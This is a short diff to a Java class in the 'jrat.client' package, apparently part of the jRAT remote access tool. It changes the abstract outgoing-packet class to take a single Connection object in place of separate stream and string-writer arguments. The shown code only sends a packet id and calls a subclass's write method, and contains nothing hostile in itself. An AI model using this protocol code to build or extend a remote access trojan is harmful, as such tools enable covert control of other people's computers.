@@ -1,19 +1,18 @@
 package jrat.client.packets.outgoing;
 
-import jrat.common.io.StringWriter;
-import java.io.DataOutputStream;
+import jrat.client.Connection;
 
 
 public abstract class AbstractOutgoingPacket {
 
-	public abstract void write(DataOutputStream dos, StringWriter sw) throws Exception;
+	public abstract void write(Connection dos) throws Exception;
 
 	public abstract short getPacketId();
 
-	public synchronized final void send(DataOutputStream dos, StringWriter sw) {
+	public synchronized final void send(Connection dos) {
 		try {
 			dos.writeShort(getPacketId());
-			this.write(dos, sw);
+			this.write(dos);
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
